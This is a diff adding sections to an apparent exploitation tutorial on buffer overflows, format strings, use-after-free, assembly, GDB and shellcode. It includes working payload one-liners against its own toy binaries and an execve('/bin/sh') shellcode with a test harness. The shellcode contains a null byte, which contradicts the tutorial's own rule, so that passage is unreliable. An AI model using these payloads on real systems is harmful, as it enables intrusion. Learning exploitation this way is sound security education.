+python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\x42\x11\x40\x00\x00\x00\x00\x00')" | ./vuln1
+
+# Result: secret_function executes!</div>
+
+            <div class="info-box">
+                <h4>Why Little-Endian Matters</h4>
+                <p>Notice the address <span class="inline-code">0x401142</span> becomes <span class="inline-code">\x42\x11\x40\x00\x00\x00\x00\x00</span> in our exploit. This is because x86/x64 systems use <strong>little-endian</strong> byte order - the least significant byte comes first in memory.</p>
+                <p>Address: <span class="inline-code">0x0000000000401142</span><br>
+                In memory: <span class="inline-code">42 11 40 00 00 00 00 00</span></p>
+                <p>This trips up beginners constantly. Always reverse byte order when writing addresses!</p>
+            </div>
+
+            <h3>Format String Vulnerabilities</h3>
+            <p>Format string bugs are another classic C vulnerability. They occur when user input is passed directly to printf-family functions as a format string.</p>
+
+            <h4>Vulnerable vs Safe Code</h4>
+            <div class="code">// VULNERABLE - User input as format string
+char user_input[100];
+gets(user_input);
+printf(user_input);  // ❌ NEVER DO THIS
+
+// SAFE - User input as data
+char user_input[100];
+gets(user_input);
+printf("%s", user_input);  // ✅ Correct way</div>
+
+            <h4>Why Format Strings Are Dangerous</h4>
+            <p>Format specifiers like <span class="inline-code">%x</span>, <span class="inline-code">%s</span>, <span class="inline-code">%n</span> allow reading and writing arbitrary memory:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Format Specifier</th>
+                        <th>Normal Use</th>
+                        <th>Exploitation Use</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">%x</span></td>
+                        <td>Print hex value</td>
+                        <td>Read stack values (leak addresses)</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">%s</span></td>
+                        <td>Print string</td>
+                        <td>Read memory at address (arbitrary read)</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">%n</span></td>
+                        <td>Write bytes printed so far</td>
+                        <td>Write to arbitrary address (arbitrary write!)</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">%p</span></td>
+                        <td>Print pointer</td>
+                        <td>Leak addresses from stack</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">%$</span></td>
+                        <td>Direct parameter access</td>
+                        <td>Access specific stack positions</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h4>Format String Exploitation Example</h4>
+            <div class="code">// format_vuln.c
+#include <stdio.h>
+
+int secret = 0xdeadbeef;
+
+int main(int argc, char **argv) {
+    char buffer[100];
+    
+    printf("secret is at: %p\n", &secret);
+    printf("Enter input: ");
+    fgets(buffer, sizeof(buffer), stdin);
+    
+    printf("You entered: ");
+    printf(buffer);  // ❌ Vulnerable!
+    
+    printf("\nsecret value: 0x%x\n", secret);
+    return 0;
+}
+
+// EXPLOITATION EXAMPLES:
+
+// 1. LEAK STACK DATA
+./format_vuln
+AAAA%x.%x.%x.%x.%x
+# Output: AAAA414141.bffff720.8048450.bffff738.bffff800
+
+# The "41414141" is "AAAA" in hex - we control stack data!
+
+// 2. READ ARBITRARY MEMORY
+./format_vuln
+%s
+# Reads string from wherever stack pointer points
+
+// 3. WRITE ARBITRARY MEMORY (change secret value)
+./format_vuln
+AAAA%x%x%n
+# Writes number of bytes printed so far to address 0x41414141
+
+// REAL EXPLOIT (simplified):
+# Calculate: How many bytes to write to get desired value
+# Use %n to write that many bytes to target address
+# Result: Changed secret value without direct access!</div>
+
+            <div class="warning-box">
+                <h4>⚠️ Format Strings Are Still Dangerous Today</h4>
+                <p>Despite being an old vulnerability class, format strings still appear in:</p>
+                <ul>
+                    <li>Legacy C codebases that haven't been audited</li>
+                    <li>Embedded systems and IoT devices</li>
+                    <li>Kernel code (where mistakes are catastrophic)</li>
+                    <li>Third-party libraries with poor security practices</li>
+                </ul>
+                <p>A single <span class="inline-code">printf(user_input)</span> can give attackers complete memory read/write capabilities.</p>
+            </div>
+
+            <h3>Heap Exploitation Introduction</h3>
+            <p>The heap is where dynamically allocated memory lives (malloc/free). Heap exploitation is more complex than stack exploitation, but incredibly powerful.</p>
+
+            <h4>Common Heap Vulnerabilities</h4>
+
+            <div class="card-grid">
+                <div class="card">
+                    <h4>Use-After-Free (UAF)</h4>
+                    <p><strong>Vulnerability:</strong> Program frees memory but keeps pointer, then uses it again.</p>
+                    <p><strong>Exploitation:</strong> Allocate new object in freed memory, control what "freed" pointer points to.</p>
+                    <p><strong>Impact:</strong> Can hijack program flow, corrupt data structures.</p>
+                </div>
+                <div class="card">
+                    <h4>Double-Free</h4>
+                    <p><strong>Vulnerability:</strong> Program frees same memory twice.</p>
+                    <p><strong>Exploitation:</strong> Corrupts heap metadata, can lead to arbitrary write.</p>
+                    <p><strong>Impact:</strong> Memory corruption, potential code execution.</p>
+                </div>
+                <div class="card">
+                    <h4>Heap Overflow</h4>
+                    <p><strong>Vulnerability:</strong> Buffer overflow on heap-allocated memory.</p>
+                    <p><strong>Exploitation:</strong> Overwrite heap metadata or adjacent objects.</p>
+                    <p><strong>Impact:</strong> Control over heap allocator, arbitrary write primitives.</p>
+                </div>
+            </div>
+
+            <h4>Use-After-Free Example</h4>
+            <div class="code">// uaf_vuln.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+struct User {
+    char name[32];
+    void (*greet)(void);
+};
+
+void normal_greet() {
+    printf("Hello, normal user!\n");
+}
+
+void admin_greet() {
+    printf("🔑 Hello, ADMIN! You have root access!\n");
+}
+
+int main() {
+    struct User *user = malloc(sizeof(struct User));
+    strcpy(user->name, "John");
+    user->greet = normal_greet;
+    
+    user->greet();  // Prints: Hello, normal user!
+    
+    free(user);  // Memory freed...
+    
+    // ❌ BUG: user pointer still used, but memory is freed!
+    
+    // Attacker allocates new memory that reuses freed space
+    struct User *evil = malloc(sizeof(struct User));
+    strcpy(evil->name, "Hacker");
+    evil->greet = admin_greet;  // Overwrites function pointer
+    
+    user->greet();  // Now calls admin_greet()!
+    // Output: Hello, ADMIN! You have root access!
+    
+    return 0;
+}
+
+// WHY THIS WORKS:
+// 1. user points to heap address (e.g., 0x1234000)
+// 2. free(user) marks memory as available but doesn't change user pointer
+// 3. malloc() for evil likely returns same address (0x1234000)
+// 4. evil->greet = admin_greet overwrites the freed memory
+// 5. user->greet() dereferences freed pointer, calls attacker's function!</div>
+
+            <h3>Dangerous C Functions</h3>
+            <p>Certain C functions are notoriously dangerous and should be avoided (or used with extreme caution). Recognizing these in code reviews is essential:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Dangerous Function</th>
+                        <th>Why Dangerous</th>
+                        <th>Safe Alternative</th>
+                        <th>Example Vulnerability</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">gets()</span></td>
+                        <td>No bounds checking</td>
+                        <td><span class="inline-code">fgets(buf, size, stdin)</span></td>
+                        <td>Buffer overflow</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">strcpy()</span></td>
+                        <td>No length check</td>
+                        <td><span class="inline-code">strncpy()</span> or <span class="inline-code">strlcpy()</span></td>
+                        <td>Buffer overflow</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">strcat()</span></td>
+                        <td>No length check</td>
+                        <td><span class="inline-code">strncat()</span> or <span class="inline-code">strlcat()</span></td>
+                        <td>Buffer overflow</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">sprintf()</span></td>
+                        <td>No bounds checking</td>
+                        <td><span class="inline-code">snprintf()</span></td>
+                        <td>Buffer overflow</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">scanf("%s")</span></td>
+                        <td>No length limit</td>
+                        <td><span class="inline-code">scanf("%50s")</span></td>
+                        <td>Buffer overflow</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">printf(user_input)</span></td>
+                        <td>Format string vuln</td>
+                        <td><span class="inline-code">printf("%s", user_input)</span></td>
+                        <td>Format string</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="info-box">
+                <h4>Code Auditing Checklist</h4>
+                <p>When reviewing C code for vulnerabilities, always check:</p>
+                <ul>
+                    <li>✅ Are buffer sizes clearly defined and respected?</li>
+                    <li>✅ Are pointers checked for NULL before dereferencing?</li>
+                    <li>✅ Is memory freed exactly once (no double-free)?</li>
+                    <li>✅ Are freed pointers set to NULL (prevent use-after-free)?</li>
+                    <li>✅ Are dangerous functions (strcpy, gets, etc.) avoided?</li>
+                    <li>✅ Are format strings never controlled by user input?</li>
+                    <li>✅ Are integer overflows checked before allocation?</li>
+                    <li>✅ Are return values from functions checked for errors?</li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- SECTION: ASSEMBLY & GDB (MEGA SECTION) -->
+        <!-- ============================================================ -->
+        <section class="section" id="assembly-intro">
+            <h2 class="section-title">Assembly & GDB: Reading the Matrix</h2>
+            <p class="section-intro">Assembly is the language closest to what the CPU actually executes. When you reverse engineer malware, analyze exploits, or craft shellcode, you're working in assembly. Combined with GDB (the GNU Debugger), these skills let you see exactly what's happening inside a running program - the ultimate superpower for exploitation.</p>
+
+            <div class="metaphor-box">
+                <h4>🎬 The Movie Analogy</h4>
+                <p>High-level code (Python, C) is like watching a movie - you see the story, characters, and plot. Assembly is like seeing the raw film frames, camera angles, lighting, and editing cuts. GDB is your director's commentary that lets you pause on any frame, rewind, and understand exactly how each shot was constructed.</p>
+                <p>Most people are content watching the movie. Hackers want to see how it was made, find the mistakes, and sometimes edit the film in real-time.</p>
+            </div>
+
+            <h3>x86-64 Architecture Basics</h3>
+            <p>Modern computers use x86-64 (also called x64 or AMD64) architecture. Understanding registers, memory, and instructions is essential.</p>
+
+            <h4>CPU Registers - The Fastest Memory</h4>
+            <p>Registers are tiny, ultra-fast storage locations inside the CPU. Think of them as the CPU's working memory:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Register</th>
+                        <th>Purpose</th>
+                        <th>Exploitation Relevance</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>RAX</strong></td>
+                        <td>Accumulator, return values</td>
+                        <td>Function return values, syscall numbers</td>
+                    </tr>
+                    <tr>
+                        <td><strong>RBX</strong></td>
+                        <td>Base register</td>
+                        <td>General purpose, often preserved across calls</td>
+                    </tr>
+                    <tr>
+                        <td><strong>RCX</strong></td>
+                        <td>Counter</td>
+                        <td>Loop counters, 4th function argument</td>
+                    </tr>
+                    <tr>
+                        <td><strong>RDX</strong></td>
+                        <td>Data register</td>
+                        <td>3rd function argument, I/O operations</td>
+                    </tr>
+                    <tr>
+                        <td><strong>RSI</strong></td>
+                        <td>Source index</td>
+                        <td>2nd function argument, string operations</td>
+                    </tr>
+                    <tr>
+                        <td><strong>RDI</strong></td>
+                        <td>Destination index</td>
+                        <td>1st function argument, string operations</td>
+                    </tr>
+                    <tr>
+                        <td><strong>RBP</strong></td>
+                        <td>Base pointer</td>
+                        <td>Points to stack frame base</td>
+                    </tr>
+                    <tr>
+                        <td><strong>RSP</strong></td>
+                        <td>Stack pointer</td>
+                        <td>Points to top of stack (critical for exploitation)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>RIP</strong></td>
+                        <td>Instruction pointer</td>
+                        <td>Points to next instruction (control flow hijacking target)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>R8-R15</strong></td>
+                        <td>General purpose</td>
+                        <td>Extra registers for x64, function arguments</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="info-box">
+                <h4>Register Naming Convention</h4>
+                <p>Registers have different names based on size:</p>
+                <ul>
+                    <li><strong>64-bit:</strong> RAX, RBX, RCX, ... (R prefix)</li>
+                    <li><strong>32-bit:</strong> EAX, EBX, ECX, ... (E prefix)</li>
+                    <li><strong>16-bit:</strong> AX, BX, CX, ... (no prefix)</li>
+                    <li><strong>8-bit:</strong> AL, BL, CL, ... (L suffix for low byte)</li>
+                </ul>
+                <p>Example: RAX (64-bit) → EAX (lower 32 bits) → AX (lower 16 bits) → AL (lower 8 bits)</p>
+            </div>
+
+            <h4>x64 Calling Convention</h4>
+            <p>Understanding how functions are called is crucial for exploitation:</p>
+
+            <div class="code">// C code:
+int add(int a, int b, int c, int d, int e, int f, int g) {
+    return a + b + c + d + e + f + g;
+}
+
+int result = add(1, 2, 3, 4, 5, 6, 7);
+
+// x64 Assembly (Linux):
+// Arguments passed in registers, then stack:
+mov rdi, 1      ; 1st argument → RDI
+mov rsi, 2      ; 2nd argument → RSI
+mov rdx, 3      ; 3rd argument → RDX
+mov rcx, 4      ; 4th argument → RCX
+mov r8,  5      ; 5th argument → R8
+mov r9,  6      ; 6th argument → R9
+push 7          ; 7th argument → STACK (doesn't fit in registers)
+call add
+
+// Inside add():
+add rdi, rsi    ; a + b
+add rdi, rdx    ; + c
+add rdi, rcx    ; + d
+add rdi, r8     ; + e
+add rdi, r9     ; + f
+add rdi, [rsp+8]; + g (7th arg from stack)
+mov rax, rdi    ; Return value in RAX
+ret             ; Return to caller</div>
+
+            <h3 id="reading-assembly">Reading Assembly Code</h3>
+            <p>Assembly instructions are the actual operations the CPU performs. Let's learn to read them fluently.</p>
+
+            <h4>Essential Instructions</h4>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Instruction</th>
+                        <th>Description</th>
+                        <th>Example</th>
+                        <th>What It Does</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">mov</span></td>
+                        <td>Move data</td>
+                        <td><span class="inline-code">mov rax, 5</span></td>
+                        <td>RAX = 5</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">add</span></td>
+                        <td>Addition</td>
+                        <td><span class="inline-code">add rax, rbx</span></td>
+                        <td>RAX = RAX + RBX</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">sub</span></td>
+                        <td>Subtraction</td>
+                        <td><span class="inline-code">sub rax, 10</span></td>
+                        <td>RAX = RAX - 10</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">imul</span></td>
+                        <td>Signed multiply</td>
+                        <td><span class="inline-code">imul rax, 2</span></td>
+                        <td>RAX = RAX * 2</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">xor</span></td>
+                        <td>XOR operation</td>
+                        <td><span class="inline-code">xor rax, rax</span></td>
+                        <td>RAX = 0 (common idiom)</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">cmp</span></td>
+                        <td>Compare (subtract but don't store)</td>
+                        <td><span class="inline-code">cmp rax, 10</span></td>
+                        <td>Sets flags based on RAX - 10</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">jmp</span></td>
+                        <td>Unconditional jump</td>
+                        <td><span class="inline-code">jmp 0x401000</span></td>
+                        <td>Go to address 0x401000</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">je/jz</span></td>
+                        <td>Jump if equal/zero</td>
+                        <td><span class="inline-code">je 0x401000</span></td>
+                        <td>Jump if last cmp was equal</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">jne/jnz</span></td>
+                        <td>Jump if not equal/not zero</td>
+                        <td><span class="inline-code">jne 0x401000</span></td>
+                        <td>Jump if last cmp was NOT equal</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">call</span></td>
+                        <td>Call function</td>
+                        <td><span class="inline-code">call printf</span></td>
+                        <td>Push return address, jump to function</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">ret</span></td>
+                        <td>Return from function</td>
+                        <td><span class="inline-code">ret</span></td>
+                        <td>Pop return address, jump to it</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">push</span></td>
+                        <td>Push to stack</td>
+                        <td><span class="inline-code">push rax</span></td>
+                        <td>Decrement RSP, store RAX at [RSP]</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">pop</span></td>
+                        <td>Pop from stack</td>
+                        <td><span class="inline-code">pop rax</span></td>
+                        <td>Load [RSP] into RAX, increment RSP</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">lea</span></td>
+                        <td>Load effective address</td>
+                        <td><span class="inline-code">lea rax, [rbx+8]</span></td>
+                        <td>RAX = RBX + 8 (address math)</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">nop</span></td>
+                        <td>No operation</td>
+                        <td><span class="inline-code">nop</span></td>
+                        <td>Do nothing (useful for padding/alignment)</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h4>Reading Real Assembly</h4>
+            <p>Let's translate some C code to assembly and back:</p>
+
+            <div class="code">// C CODE:
+int check_password(char *input) {
+    if (strcmp(input, "secret123") == 0) {
+        return 1;  // Success
+    }
+    return 0;  // Failure
+}
+
+// ASSEMBLY (simplified):
+check_password:
+    push rbp
+    mov rbp, rsp              ; Set up stack frame
+    mov rax, rdi              ; input pointer in RDI (1st arg)
+    lea rsi, [rel password]   ; Load address of "secret123"
+    mov rdi, rax              ; Move input to RDI (1st arg for strcmp)
+    call strcmp               ; Call strcmp(input, "secret123")
+    test eax, eax             ; Check if return value is 0
+    jne .fail                 ; If not zero, jump to fail
+    mov eax, 1                ; Return 1 (success)
+    jmp .end
+.fail:
+    mov eax, 0                ; Return 0 (failure)
+.end:
+    pop rbp
+    ret
+
+// READING THIS AS A HACKER:
+# Line 3-4: Stack frame setup (standard function prologue)
+# Line 5-7: Preparing arguments for strcmp
+# Line 8: Comparing strings
+# Line 9-10: If strings DON'T match (eax != 0), jump to fail
+# Line 11: If we didn't jump, strings matched - return 1
+# 
+# EXPLOITATION INSIGHT:
+# The password "secret123" is stored in the binary as a string.
+# We can find it with: strings ./binary | grep secret
+# Or in GDB: x/s &password
+# Or we can patch the je instruction to always succeed!</div>
+
+            <h3 id="gdb-debugging">GDB: The Ultimate Debugging Tool</h3>
+            <p>GDB (GNU Debugger) lets you pause programs, inspect memory, modify registers, and understand exactly what's happening inside a binary. It's essential for exploitation.</p>
+
+            <h4>Essential GDB Commands</h4>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Command</th>
+                        <th>Description</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">run [args]</span></td>
+                        <td>Start program</td>
+                        <td><span class="inline-code">run AAAA</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">break *0x401234</span></td>
+                        <td>Set breakpoint at address</td>
+                        <td><span class="inline-code">break *main</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">continue</span></td>
+                        <td>Continue execution</td>
+                        <td><span class="inline-code">c</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">stepi</span></td>
+                        <td>Execute one instruction</td>
+                        <td><span class="inline-code">si</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">nexti</span></td>
+                        <td>Execute one instruction (step over calls)</td>
+                        <td><span class="inline-code">ni</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">info registers</span></td>
+                        <td>Show all registers</td>
+                        <td><span class="inline-code">i r</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">x/20x $rsp</span></td>
+                        <td>Examine memory (20 hex words from RSP)</td>
+                        <td><span class="inline-code">x/s 0x401000</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">disassemble main</span></td>
+                        <td>Disassemble function</td>
+                        <td><span class="inline-code">disas main</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">set $rax=0x1234</span></td>
+                        <td>Modify register</td>
+                        <td><span class="inline-code">set $rip=0x401000</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">backtrace</span></td>
+                        <td>Show call stack</td>
+                        <td><span class="inline-code">bt</span></td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h4>GDB Memory Examination Formats</h4>
+            <div class="code"># x/[count][format][size] [address]
+
+# FORMATS:
+x - hexadecimal
+d - decimal
+u - unsigned decimal
+o - octal
+t - binary
+a - address
+c - character
+s - string
+i - instruction
+
+# SIZES:
+b - byte (1 byte)
+h - halfword (2 bytes)
+w - word (4 bytes)
+g - giant word (8 bytes)
+
+# EXAMPLES:
+x/20x $rsp          # 20 hex words from stack pointer
+x/10i $rip          # 10 instructions from instruction pointer
+x/s 0x401000        # String at address
+x/100x $rsp         # 100 hex words from stack
+x/gx $rbp           # 8-byte hex value at RBP</div>
+
+            <h4>Exploiting with GDB: Step-by-Step</h4>
+            <p>Let's exploit our vulnerable program from earlier using GDB:</p>
+
+            <div class="code"># Step 1: Start GDB
+gdb ./vuln1
+
+# Step 2: Set breakpoint at vulnerable function
+(gdb) break vulnerable_function
+Breakpoint 1 at 0x401234
+
+# Step 3: Run with test input
+(gdb) run AAAA
+Breakpoint 1, vulnerable_function()
+
+# Step 4: Check registers
+(gdb) info registers
+rax            0x7fffffffdb00
+rbx            0x0
+rsp            0x7fffffffda80    ← Stack pointer
+rbp            0x7fffffffdae0    ← Base pointer
+rip            0x401234          ← Current instruction
+
+# Step 5: Examine stack before overflow
+(gdb) x/20x $rsp
+0x7fffffffda80: 0x41414141  0x00000000  0x00000000  0x00000000
+0x7fffffffda90: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7fffffffdaa0: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7fffffffdab0: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7fffffffdac0: 0xffff1234  0x00007fff  0xffffdae0  0x00007fff
+                                        ↑ Saved RBP  ↑ Return address
+
+# Step 6: Continue execution
+(gdb) continue
+You entered: AAAA
+Returned safely.
+[Inferior 1 (process 1234) exited normally]
+
+# Step 7: Try overflow payload
+(gdb) run $(python3 -c 'print("A"*72 + "\x42\x11\x40\x00\x00\x00\x00\x00")')
+Breakpoint 1, vulnerable_function()
+
+# Step 8: Step through strcpy
+(gdb) stepi
+... (step until after strcpy)
+
+# Step 9: Examine stack after overflow
+(gdb) x/20x $rsp
+0x7fffffffda80: 0x41414141  0x41414141  0x41414141  0x41414141
+0x7fffffffda90: 0x41414141  0x41414141  0x41414141  0x41414141
+0x7fffffffdaa0: 0x41414141  0x41414141  0x41414141  0x41414141
+0x7fffffffdab0: 0x41414141  0x41414141  0x41414141  0x41414141
+0x7fffffffdac0: 0x41414141  0x41414141  0x00401142  0x00000000
+                ↑ Overwritten!     ↑ Attacker-controlled return address!
+
+# Step 10: Continue to return
+(gdb) continue
+
+# Result: Program jumps to 0x401142 (secret_function)!
+🎉 You exploited the buffer overflow!</div>
+
+            <div class="info-box">
+                <h4>GDB Extensions for Exploitation</h4>
+                <p>Enhance GDB with these powerful extensions:</p>
+                <ul>
+                    <li><strong>pwndbg:</strong> Most popular, colorful output, exploit development features</li>
+                    <li><strong>GEF:</strong> (GDB Enhanced Features) Similar to pwndbg, different UI</li>
+                    <li><strong>peda:</strong> Python Exploit Development Assistance, pattern creation</li>
+                </ul>
+                <p>Install pwndbg: <span class="inline-code">git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh</span></p>
+            </div>
+
+            <h4>Finding Offset with Patterns</h4>
+            <p>Instead of guessing buffer sizes, use cyclic patterns:</p>
+
+            <div class="code"># Generate unique pattern
+(gdb) pattern create 200
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1...'
+
+# Run program with pattern
+(gdb) run 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1...'
+
+# Program crashes, check what overwrote RIP
+(gdb) info registers rip
+rip: 0x4141304141614141
+
+# Find offset of that value in pattern
+(gdb) pattern offset 0x4141304141614141
+Pattern found at offset: 72
+
+# Now we know: 72 bytes to reach return address!</div>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- SECTION: SHELLCODE & EXPLOITATION (COMBINED) -->
+        <!-- ============================================================ -->
+        <section class="section" id="shellcode">
+            <h2 class="section-title">Shellcode & Exploit Development</h2>
+            <p class="section-intro">Shellcode is the payload you inject into a vulnerable program. It's machine code that performs actions you want - typically spawning a shell, hence the name. Combined with exploit techniques, shellcode transforms theoretical vulnerabilities into practical attacks that give you complete system control.</p>
+
+            <div class="metaphor-box">
+                <h4>🔑 The Master Key Analogy</h4>
+                <p>Finding a buffer overflow is like discovering that a bank vault's door is broken. But that's not enough - you need a way to open it once you're there. Shellcode is your master key: compact, reliable code that works in constrained environments and gives you access to the system.</p>
+                <p>Just like a master key must be precisely crafted to work in various locks, shellcode must be carefully written to avoid bad characters, fit in small spaces, and work reliably across different systems.</p>
+            </div>
+
+            <h3>What is Shellcode?</h3>
+            <p>Shellcode is position-independent machine code that:</p>
+            <ul>
+                <li>Executes arbitrary commands (typically spawns a shell)</li>
+                <li>Contains no null bytes (0x00) that would terminate string copies</li>
+                <li>Is small enough to fit in exploited buffers</li>
+                <li>Works without relying on specific memory addresses</li>
+            </ul>
+
+            <h4>Simple Shellcode Example (x86-64 Linux)</h4>
+            <div class="code">// C equivalent:
+execve("/bin/sh", NULL, NULL);
+
+// Assembly:
+xor rax, rax              ; Clear RAX (zero out)
+push rax                  ; Push NULL terminator
+mov rdi, 0x68732f6e69622f ; "/bin/sh" in little-endian
+push rdi                  ; Push "/bin/sh" onto stack
+mov rdi, rsp              ; RDI = pointer to "/bin/sh"
+xor rsi, rsi              ; RSI = NULL (argv)
+xor rdx, rdx              ; RDX = NULL (envp)
+mov al, 59                ; RAX = 59 (syscall number for execve)
+syscall                   ; Execute syscall
+
+// Machine code (hexadecimal):
+\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57
+\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05
+
+// This is 27 bytes of pure exploitation power!</div>
+
+            <h4>Understanding Syscalls</h4>
+            <p>Shellcode relies on syscalls - direct requests to the kernel. On Linux x86-64:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Syscall Number</th>
+                        <th>Syscall Name</th>
+                        <th>Description</th>
+                        <th>Arguments</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>0</td>
+                        <td>read</td>
+                        <td>Read from file descriptor</td>
+                        <td>RDI=fd, RSI=buf, RDX=count</td>
+                    </tr>
+                    <tr>
+                        <td>1</td>
+                        <td>write</td>
+                        <td>Write to file descriptor</td>
+                        <td>RDI=fd, RSI=buf, RDX=count</td>
+                    </tr>
+                    <tr>
+                        <td>59</td>
+                        <td>execve</td>
+                        <td>Execute program</td>
+                        <td>RDI=filename, RSI=argv, RDX=envp</td>
+                    </tr>
+                    <tr>
+                        <td>60</td>
+                        <td>exit</td>
+                        <td>Terminate process</td>
+                        <td>RDI=status</td>
+                    </tr>
+                    <tr>
+                        <td>57</td>
+                        <td>fork</td>
+                        <td>Create new process</td>
+                        <td>None</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h4>How to Make a Syscall</h4>
+            <div class="code">// Syscall convention on x86-64 Linux:
+
+# 1. Put syscall number in RAX
+mov rax, 1          ; Syscall 1 = write
+
+# 2. Put arguments in registers (in order):
+mov rdi, 1          ; 1st arg: file descriptor (1 = stdout)
+mov rsi, message    ; 2nd arg: buffer address
+mov rdx, 13         ; 3rd arg: buffer length
+
+# 3. Execute syscall instruction
+syscall
+
+# 4. Return value in RAX
+# If RAX < 0, error occurred</div>
+
+            <h3>Avoiding Bad Characters</h3>
+            <p>The most common constraint in shellcode is avoiding null bytes (0x00), which terminate string operations like strcpy().</p>
+
+            <h4>Techniques to Eliminate Null Bytes</h4>
+
+            <div class="card-grid">
+                <div class="card">
+                    <h4>Use XOR Instead of MOV</h4>
+                    <p><strong>Bad:</strong> <span class="inline-code">mov rax, 0</span> → Contains null bytes</p>
+                    <p><strong>Good:</strong> <span class="inline-code">xor rax, rax</span> → Same result, no nulls</p>
+                    <p>XOR of a value with itself always equals zero, and the instruction has no null bytes.</p>
+                </div>
+                <div class="card">
+                    <h4>Use Smaller Registers</h4>
+                    <p><strong>Bad:</strong> <span class="inline-code">mov rax, 59</span> → <span class="inline-code">\x48\xc7\xc0\x3b\x00\x00\x00</span></p>
+                    <p><strong>Good:</strong> <span class="inline-code">mov al, 59</span> → <span class="inline-code">\xb0\x3b</span></p>
+                    <p>When you only need small values, use 8-bit registers.</p>
+                </div>
+                <div class="card">
+                    <h4>Push Instead of MOV</h4>
+                    <p><strong>Bad:</strong> <span class="inline-code">mov [rsp], 0x68732f</span></p>
+                    <p><strong>Good:</strong> <span class="inline-code">push 0x68732f</span></p>
+                    <p>Push is more compact and often avoids null bytes.</p>
+                </div>
+            </div>
+
+            <h4>Testing Shellcode</h4>
+            <p>Before injecting shellcode into exploits, test it standalone:</p>
+
+            <div class="code">// shellcode_test.c
+#include <stdio.h>
+#include <string.h>
+
+// Your shellcode here
+unsigned char shellcode[] = 
+    "\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57"
+    "\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05";
+
+int main() {
+    printf("Shellcode length: %lu bytes\n", strlen(shellcode));
+    
+    // Cast shellcode to function pointer and execute
+    void (*func)() = (void(*)())shellcode;
+    func();
+    
+    return 0;
+}
+
+// Compile with executable stack:
+// gcc shellcode_test.c -o test -z execstack -no-pie
+// ./test
+// Result: Spawns shell!</div>
+
+            <h3 id="exploit-dev">Exploit Development Process</h3>
+            <p>Let's walk through developing a complete exploit from vulnerability to working payload.</p>
+
+            <h4>Phase 1: Vulnerability Analysis</h4>
+            <div class="code"># Step 1: Identify the vulnerability
+# Look for: buffer overflows, format strings, use-after-free, etc.
+
+# Step 2: Determine exploitability
+# Questions to answer:
+- Where is user input stored in memory?
+- What can we overwrite with our input?
